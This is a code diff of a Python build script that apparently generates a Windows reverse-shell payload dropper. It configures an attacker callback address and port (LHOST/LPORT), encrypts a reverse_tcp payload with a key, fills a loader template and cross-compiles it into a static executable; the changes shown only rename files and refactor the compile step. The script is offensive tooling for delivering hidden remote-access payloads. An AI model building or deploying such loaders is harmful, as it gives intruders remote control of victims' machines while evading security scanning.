@@ -1,18 +1,20 @@
 from insert_code import insert_payload
 from encrypt import encrypt
+from compiler import compile_code
+
 import subprocess as sb
 
 LHOST = '192.168.100.1'
 
 LPORT = '6942'
 
-RAW_CODE_FILE = 'reverse_tcp_raw.txt'
+RAW_CODE_FILE = 'reverse_tcp_raw.bin'
 
-ENCRYPTED_CODE_FILE = 'reverse_tcp_enc.txt'
+ENCRYPTED_CODE_FILE = 'reverse_tcp_enc.bin'
 
 KEY = 'x'
 
-LOADER_TEMPLATE = 'payload_deployer.cpp.template'
+LOADER_TEMPLATE = 'payload_deployer.template'
 
 GEN_CODE = 'payload_deployer_gen.cpp'
 
@@ -47,7 +49,7 @@ print('Compiling generated code...')
 compiler = sb.Popen(["x86_64-w64-mingw32-g++", GEN_CODE,
                      '-o', LOADER_EXE,  '-static', '-lpthread'])
 
-if compiler.wait() != 0:
+if not compile_code(GEN_CODE, LOADER_EXE):
     print('Error compiling generated code!')
     exit(-1)
 
